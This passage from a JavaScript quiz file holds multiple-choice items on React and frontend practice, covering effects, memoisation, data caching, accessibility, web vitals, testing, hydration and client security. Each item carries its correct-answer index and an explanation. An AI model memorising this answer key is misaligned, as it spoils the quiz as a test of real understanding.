      'Debounce the effect',
      'Compute the total during render from items',
    ], 3, 'A value derivable from existing state is not state; syncing it creates a second source of truth that can drift.'),
    q('Which situation makes useReducer a better fit than useState?', [
      'A single boolean toggle',
      'A value read from localStorage once',
      'Several related fields that must change together under guarded transitions',
      'A DOM node reference',
    ], 2, 'Reducers express transitions and invariants in one testable function, and dispatch has a stable identity.'),
    q('Rapidly switching detail pages shows data from the wrong page. The missing piece is', [
      'effect cleanup that aborts or ignores the previous request',
      'a useMemo around the fetch',
      'a stable list key',
      'a Suspense boundary',
    ], 0, 'Responses can arrive out of order, so the earlier request must be cancelled or its result discarded on cleanup.'),
    q('Every consumer of a context re-renders on each provider render. The likely cause is', [
      'consumers are not wrapped in React.memo',
      'the provider passes a newly created object as its value',
      'the context has no default value',
      'the provider is too high in the tree',
    ], 1, 'Context notifies consumers when the value fails an identity check, and an inline object is new every render.'),
    q('What does React.memo actually prevent?', [
      "Re-renders caused by the component's own state",
      'Re-renders caused by context updates',
      'Re-renders caused by a parent rendering when props are unchanged',
      'DOM updates in general',
    ], 2, 'memo skips the parent-driven re-render only, and only while every prop keeps the same identity.'),
    q('Virtualising a 5,000-row list mainly improves performance by', [
      'shrinking the JavaScript bundle',
      'caching row components with useMemo',
      'moving rendering to a web worker',
      'reducing the number of DOM nodes the browser must lay out and paint',
    ], 3, 'Only the visible window plus overscan is rendered, so layout, paint and diffing cost collapses.'),
    q('Client-side form validation should be treated as', [
      'sufficient protection for the database',
      'a usability feature, with the server validating the same rules again',
      'optional if the API validates',
      'a replacement for required attributes',
    ], 1, 'Anyone can post directly to the endpoint, so server validation is the only validation that actually protects data.'),
    q('Why does React Testing Library recommend getByRole over getByTestId?', [
      'It queries the way users and assistive technology perceive the UI, so it also catches naming and role bugs',
      'It runs faster',
      'Test ids are deprecated',
      'It works without rendering',
    ], 0, 'Querying by role and accessible name tests the real interface rather than an implementation detail invisible to users.'),
    q('An error boundary shows its fallback and never recovers, even after the user opens a different record. What is missing?', [
      'componentDidCatch',
      'A global unhandledrejection listener',
      'resetKeys, or an equivalent reset, so the boundary clears when its inputs change',
      'A Suspense boundary around the same subtree',
    ], 2, 'Boundary state persists until something resets it, so a tripped boundary keeps rendering the old error for the rest of the session.'),
    q('A build-time environment variable in a React app is the right place for', [
      'a public API base URL, and never a secret, because it is inlined into the shipped bundle',
      'a database password, since only the build server reads it',
      'a payment provider secret key, provided the variable is prefixed',
      'a JWT signing key, because the bundle is minified',
    ], 0, 'Client env vars are text-substituted at build time, so every value they hold is readable by anyone who downloads the bundle.'),
    q('A cookie banner that loads late and pushes the page down damages', [
      'LCP, because the banner is the largest element',
      'INP, because the banner blocks the main thread',
      'TTFB, because it adds a request',
      'CLS, because already-painted content moves after the user can see it',
    ], 3, 'Content inserted above existing layout after paint is exactly what Cumulative Layout Shift measures.'),
    q('Rendering user-supplied HTML with dangerouslySetInnerHTML is acceptable only when', [
      'the value was returned by your own API',
      'it has been sanitised against an allow-list of tags and attributes first',
      'the application is running in production mode',
      'the element is hidden with CSS until the user opts in',
    ], 1, 'The prop hands the string straight to the HTML parser, so only sanitisation before that point prevents stored XSS.'),
      q('A screen stores its request state with const [state, setState] = useState({ status: \'idle\' }), and a later setState({ status: \'ready\', invoices }) refuses to compile. What is the real problem?', [
      'Objects in state must be replaced whole, so the previous value has to be spread in',
      'Writing \'idle\' as const fixes it by making the literal available to every setter',
      'Inference widened the state to { status: string }, so annotate useState<InvoiceState>',
      'useState cannot infer object types at all, so object state belongs in a reducer',
    ], 2, 'The initial value describes one shape and widens status to string, which both rejects the extra fields and narrows nothing in a switch, so annotating the hook with the discriminated union is what makes each member legal and each branch narrow.'),
    q('Forty Playwright specs each sign in through the login form, and the suite only stays green when it runs on a single worker. Which change fixes the runtime and the flake together?', [
      'Give each spec a fixture that creates and deletes its own account through the API',
      'Truncate the database before every spec so no test inherits another test\'s rows',
      'Raise retries to two in CI and treat the runs marked flaky as passes for release',
      'Sign in once in global setup and reuse that single account across all workers',
    ], 0, 'Per test data created through the API removes both the repeated UI login and the shared row that forces serial execution, so the suite can spread across workers without any two tests touching the same record.'),
    q('A design system declares @layer reset, base, components, utilities, overrides and ships into components. An application writes .btn { padding: 4px } inside @layer overrides and nothing changes. What explains it?', [
      'The overrides layer is declared last, and the last layer in the list has lowest priority',
      'The system selector uses an id, and specificity still decides between two separate layers',
      'clsx places the system class after the application class, and the later name wins here',
      'The system stylesheet is imported outside any layer, and unlayered styles beat every layer',
    ], 3, 'Layer order only ranks rules that are actually in layers, and unlayered styles sit above the entire stack, so a design system loaded outside the layer declaration outranks every override an application writes.'),
    q('A route was moved to SSR, its HTML clearly contains the content, and one hydration mismatch warning was filed as cosmetic. Field data shows LCP no better than before the move. What connects those two facts?', [
      'The mismatch sits on a boundary React never hydrates, so LCP cannot be affected by it',
      'React discarded the server markup for that subtree and rendered it in the browser instead',
      'Hydration blocks the first paint, so the markup arrives early but cannot be painted yet',
      'The warning means the bundle was evaluated twice, doubling parse time before the paint',
    ], 1, 'A mismatch makes React abandon the server HTML for that subtree and client render it from scratch, so the route pays the TTFB cost of SSR and still gets client rendering timings in the field.'),
    q('A streamed page keeps reviews inside a Suspense boundary. A crawler that does not execute inline scripts indexes the skeleton rather than the reviews. What is the right response?', [
      'Serve those requests from onAllReady, trading streaming away for a complete document',
      'Raise the abort timeout so the crawler stays connected until the reviews resolve',
      'Drop bootstrapScripts for crawler requests, so the placeholder resolves on the server',
      'Wrap the reviews in an error boundary, which renders content ahead of the fallback',
    ], 0, 'Resolved boundaries are streamed as hidden templates that a small inline script moves into place, so a consumer that runs no scripts only sees real content when onAllReady waits for every boundary and emits one finished document.'),
    q('A codemod renamed Button\'s type prop to variant across 1,400 call sites and the migration was closed. Three months later new type usages are back in the codebase. What was missing?', [
      'A second codemod run against main once the release branch had been merged',
      'A production console warning, since the development one is stripped from builds',
      'Deleting the old prop in the same release, which is what stops people using it',
      'A lint rule that errors on the old prop name for as long as the migration runs',
    ], 3, 'A codemod only fixes the call sites that exist on the day it runs, so without a rule that fails the build on the old name people keep writing it and the spread or renamed call sites the transform could never see are never cleaned up.'),
    q('A list renders `items.map((item, i) => <Row key={i} item={item} />)`, and each Row keeps a half-typed note in its own state. A new item is inserted at the top of the list. What does the user see?', [
      'The half-typed notes now sit beside the wrong items',
      'React warns about duplicate keys and skips the new row',
      'Every row remounts, so all the half-typed notes are wiped',
      'Nothing changes, because keys only affect render speed',
    ], 0, 'With index keys the element at position 0 is treated as the same element as before, so its state stays at position 0 while the item it shows changes.'),
    q('`function Badge({ tone = \'neutral\' })` is rendered as `<Badge tone={null} />`. What is the value of `tone` inside the component?', [
      '\'neutral\', because any empty value falls back to the default',
      'null, because a destructuring default only replaces undefined',
      'undefined, because React strips null props before rendering',
      'It throws, because null is not a valid value for a prop',
    ], 1, 'Destructuring defaults apply only when the value is undefined, so an explicit null passes straight through.'),
    q('A Card already takes showFooter, footerAlign and footerLabel, and a new screen needs a footer that contains a checkbox. Which change scales best?', [
      'Add showFooterCheckbox and footerCheckboxLabel props to the Card',
      'Copy the Card into a new CheckboxCard used only on that screen',
      'Accept the footer as a React node through a slot prop or children',
      'Pass a footerConfig object that describes the checkbox to render',
    ], 2, 'Composition lets callers pass whatever footer they need, instead of growing a private configuration language one boolean at a time.'),
    q('`useEffect(() => { const id = setInterval(() => setCount(count + 1), 1000); return () => clearInterval(id); }, [])` shows 1 and then never changes. Why?', [
      'The cleanup function clears the interval straight after its first tick',
      'React batches interval updates and discards all but the first of them',
      'State setters cannot be called from timers, only from event handlers',
      'The interval closed over the first render\'s count, so it keeps setting 1',
    ], 3, 'The callback captured count as 0 and the effect never re-runs, so it sets 1 forever; the updater form setCount(c => c + 1) reads the latest value instead.'),
    q('A panel adds a window resize listener inside useEffect and returns no cleanup. The user opens and closes the panel ten times. What happens?', [
      'React removes the listener automatically when the panel unmounts',
      'Listeners pile up, one per mount, because nothing ever removes them',
      'Only the newest listener survives, because each add replaces the last',
      'The effect throws on the second mount because a listener already exists',
    ], 1, 'Each mount registers a new function and nothing unregisters it, so the effect must return a cleanup that calls removeEventListener.'),
    q('`useEffect(() => { load(userId); }, [])` loads the right user at first, but switching to another user shows nothing new. Why?', [
      'Effects run only once per page load, whatever their dependencies say',
      'load must be wrapped in useCallback before an effect can call it',
      'The effect does run again, but React discards the second result',
      'userId is missing from the dependencies, so the effect never runs again',
    ], 3, 'An empty dependency array means the effect synchronises only once, so it must list userId to re-run when the user changes.'),
    q('After a successful enrol mutation, the course list on screen still shows the old enrolment count. What is the standard fix with TanStack Query?', [
      'Invalidate the courses query when the mutation succeeds so it refetches',
      'Copy the list into useState and update it by hand on each screen',
      'Set staleTime to zero so that every render fetches the list again',
      'Reload the whole page after the mutation to clear out the cache',
    ], 0, 'invalidateQueries marks the cached entry stale and refetches it wherever it is on screen, which closes the gap between the mutation and the cache.'),
    q('A query uses `staleTime: 60_000`. The user navigates away within the app and comes back 30 seconds later. What happens?', [
      'A spinner shows while the data is fetched again from scratch',
      'The cache entry was removed on unmount, so the query errors',
      'The cached data is shown and no refetch happens, since it is still fresh',
      'The cached data is shown and a background refetch starts at once',
    ], 2, 'staleTime is how long cached data counts as fresh, and fresh data is served from the cache without refetching when the component mounts again.'),
    q('Why use `<Link to="/courses">` rather than `<a href="/courses">` for navigation inside a React Router app?', [
      'It navigates without a full page reload, yet still renders a real anchor',
      'It is the only kind of link that screen readers announce as a link',
      'It stops users from opening the route in a new browser tab',
      'It preloads every route\'s data before the user ever clicks',
    ], 0, 'A plain anchor triggers a full page load that discards app state, while Link navigates client-side and still renders an a element with an href.'),
    q('`const sorted = useMemo(() => sortRows(rows), [rows])`, but the parent passes `rows={data.filter(r => r.active)}`. The sort still runs on every render. Why?', [
      'useMemo can only cache results that are primitive values like numbers',
      'filter returns a new array each render, so the dependency always changes',
      'useMemo is switched off in development and only works in production',
      'sortRows sorts a copy of its input, which disables the memoisation',
    ], 1, 'Dependencies are compared with Object.is, and a freshly filtered array is a new reference every render, so the memo never hits.'),
    q('Parsing a 30 MB CSV on a button click freezes the page for two seconds. Which change keeps the page responsive while the parse runs?', [
      'Wrap the parsing function in useMemo so it is cached',
      'Wrap the click handler in useCallback to stabilise it',
      'Run the parse in a Web Worker and post the result back',
      'Put the parse inside startTransition to lower its priority',
    ], 2, 'A single long synchronous task blocks the main thread whatever React does, so the work has to move to another thread; transitions only reschedule rendering.'),
    q('Most users only ever use the dashboard, but the initial bundle also carries a rarely visited analytics route with a heavy charting library. What is the best first move?', [
      'Wrap the analytics components in React.memo so they skip re-renders',
      'Virtualise the dashboard so that fewer DOM nodes are created on load',
      'Move the charting library import into a useMemo inside the route',
      'Load the analytics route with React.lazy so it downloads only when visited',
    ], 3, 'Route-level code splitting removes the chart code from the initial bundle, so most users never download, parse or execute it.'),
    q('A search input has `placeholder="Search courses"` and no label element. What is the problem?', [
      'Screen readers read placeholders twice, which confuses their users',
      'It has no proper label, and the hint vanishes as soon as the user types',
      'Inputs that carry a placeholder cannot receive keyboard focus',
      'The placeholder text is submitted with the form as the value',
    ], 1, 'A placeholder is not a substitute for a visible label wired with htmlFor; it disappears on input and getByLabelText cannot find the field.'),
    q('A Save control is written as `<div className="btn" onClick={save}>Save</div>`. What do keyboard users lose?', [
      'Nothing, as long as the div is styled to look like a button',
      'Only the hover style, which keyboards never trigger anyway',
      'The click handler, which React ignores on non-button elements',
      'They cannot Tab to it or activate it with Enter or Space',
    ], 3, 'A div is not focusable and has no keyboard activation or role, all of which a native `<button type="button">` provides for free.'),
    q('A test asserts that a Dialog component\'s internal `isOpen` state becomes true after a click. Why is that a weak test?', [
      'It checks internals, so a refactor breaks it while users see no change',
      'State can only be asserted inside act() when fake timers are enabled',
      'It passes only when the dialog is rendered through a React portal',
      'It is too slow, because reading state requires a real browser',
    ], 0, 'Testing Library tests what a user can see and do, such as finding the dialog by role, so the test survives a rewrite to useReducer and proves the dialog appears.'),
    q('The hero image at the top of a landing page carries `loading="lazy"`. What effect does that have?', [
      'It improves LCP, because the browser downloads fewer bytes up front',
      'It prevents layout shift, because the space is held until it loads',
      'It delays the LCP image; the hero should load eagerly at high priority',
      'It has no effect at all, since browsers ignore lazy on visible images',
    ], 2, 'The hero is usually the LCP element, so it should never be lazy and should carry fetchPriority="high"; lazy loading is for images below the fold.'),
    q('While data loads, a component renders `<p>Loading…</p>`, which is then replaced by a 260px card. Which metric suffers, and what is the fix?', [
      'CLS; render a skeleton that already takes the card\'s final height',
      'LCP; show the loading text in a larger font so it paints sooner',
      'INP; debounce the request so the card appears less often',
      'TTFB; move the loading text into the server response',
    ], 0, 'Swapping 20px of text for a 260px card pushes everything below it down, and a placeholder sized like the final content reserves that space.'),
    q('Why click through `npm run build && npm run preview` locally before the first deploy, when the app already works on the dev server?', [
      'The preview server is required to generate the app\'s source maps',
      'The production build is a different program, and many bugs appear only there',
      'The build step is what runs the unit tests against the bundle',
      'The dev server cannot load environment variables at all',
    ], 1, 'The dev server serves unbundled modules while the build is minified, tree-shaken and content-hashed, and most works-on-my-machine bugs live in that gap.'),
    q('package.json lists `"chart-lib": "^4.2.0"` and no lockfile is committed. What can differ between two installs a week apart?', [
      'Nothing, because the caret pins exactly version 4.2.0',
      'Version 5.0.0 may be installed if it came out that week',
      'A newer 4.x release may be installed, so the two builds differ',
      'npm refuses to install anything without a lockfile',
    ], 2, 'A caret range accepts any later minor or patch release within 4.x, and only a committed lockfile installed with npm ci reproduces the exact tree.'),
    q('A strict Content-Security-Policy allows scripts only from your own origin and forbids inline scripts. What does it add on top of React\'s escaping?', [
      'User input is sanitised on the server before it reaches the database',
      'Tokens kept in localStorage become unreadable to all JavaScript',
      'Cross-origin fetches are blocked unless the server sends CORS headers',
      'Injected inline scripts are refused by the browser even if markup gets in',
    ], 3, 'CSP is a second line of defence: if an XSS hole lets markup through, the browser still will not execute inline or foreign scripts.'),
    q('`type State = { status: \'loading\' } | { status: \'error\'; error: Error } | { status: \'ready\'; data: Invoice[] }`. Inside `if (state.status === \'ready\') { ... }`, what does TypeScript allow?', [
      'Reading both state.data and state.error, since both are declared',
      'Reading state.data, while reading state.error is a compile error',
      'Nothing extra, since narrowing works only inside a switch statement',
      'Reading state.data, but only after adding a non-null assertion',
    ], 1, 'Checking the discriminant narrows the union to the ready member, which has data and no error property.'),
    q('Why write `const body: unknown = await res.json()` rather than leave the result typed as any?', [
      'unknown makes res.json() validate the response shape at runtime',
      'unknown lets the compiler infer the type from the server\'s reply',
      'unknown is faster at runtime because it skips JSON type checks',
      'unknown blocks every use of the value until it is narrowed or validated',
    ], 3, 'any silently allows everything, while unknown refuses every operation until you narrow it, so unchecked server data cannot flow into typed code.'),
    q('A component screenshot test fails on every run because the component shows a live countdown. What is the right fix?', [
      'Mask the countdown so it is painted over before the comparison',
      'Raise maxDiffPixelRatio until the test stops failing',
      'Regenerate the baseline on every run so it always matches',
      'Delete the test, since dynamic components cannot be captured',
    ], 0, 'The mask option paints a solid box over genuinely dynamic content, so the rest of the component is still compared strictly.'),
    q('An end-to-end test calls `await page.waitForTimeout(2000)` before clicking Pay, to let the page settle. Why is that line usually unnecessary?', [
      'Playwright disables all animations and network calls during tests',
      'Timeouts are ignored in CI, so the line never has any effect there',
      'click() already waits until the button is visible, stable and enabled',
      'The page settles in 100ms, so a much shorter wait would be enough',
    ], 2, 'Locator actions run actionability checks and retry until they pass, so a fixed sleep only adds time and still fails when the page is slower than guessed.'),
    q('A design system adds an optional `loading` prop to Button without changing any existing behaviour. Which semver release does that call for?', [
      'Minor',
      'Patch',
      'Major',
      'A prerelease only',
    ], 0, 'Adding an optional prop is a backwards-compatible feature, which semver releases as a minor version.'),
    q('When a modal dialog closes, where should keyboard focus go?', [
      'To the top of the document body',
      'Back to the control that opened the dialog',
      'To the first link on the page',
      'Nowhere, since the dialog has gone',
    ], 1, 'Returning focus to the trigger keeps keyboard and screen reader users where they were, instead of stranding them at the start of the page.'),
    q('A server-rendered form builds its input ids with `Math.random()`. What happens when the page hydrates?', [
      'Math.random is disabled during server rendering, so the ids are blank',
      'The ids match, because React seeds Math.random the same on both sides',
      'Server and client produce different ids, a mismatch that useId avoids',
      'Nothing, because hydration compares text and never looks at attributes',
    ], 2, 'Server and client each generate a different random value, producing a hydration mismatch, while useId yields the same id on both sides.'),
    q('In an app that uses server components, which of these must be a client component?', [
      'A LessonBody that renders markdown fetched from the database',
      'A Footer that renders static links and the copyright notice',
      'A CourseList that queries the database and maps rows to cards',
      'A LikeButton that keeps a count in useState and handles onClick',
    ], 3, 'State and event handlers only exist in the browser, so a component using useState or onClick must be a client component, while the others can render on the server.'),
    q('A single team of six owns a whole app and proposes micro-frontends to keep the code clean. What is the honest assessment?', [
      'A good fit, since micro-frontends make the bundle smaller and faster',
      'A cost with no benefit, since micro-frontends solve team independence',
      'A necessity, since one app cannot be split into modules any other way',
      'Harmless, since Module Federation adds no runtime cost of any kind',
    ], 1, 'Micro-frontends solve an organisational problem, independent deployment across teams, and make nothing faster or simpler, so one team pays the tax for no gain.'),
    q('Over a quarter, a dozen pull requests each add about 30 kB to the checkout bundle, and every one looked reasonable in review. What stops this happening again?', [
      'A reminder in the pull request template to keep changes small',
      'A quarterly performance review of the checkout bundle size',
      'A rule that only senior engineers may approve checkout changes',
      'A bundle size budget in CI that fails the build when it is exceeded',
    ], 3, 'Gradual growth is invisible in review because each change is defensible, so only a number that fails the build can catch it.'),
  ],
});
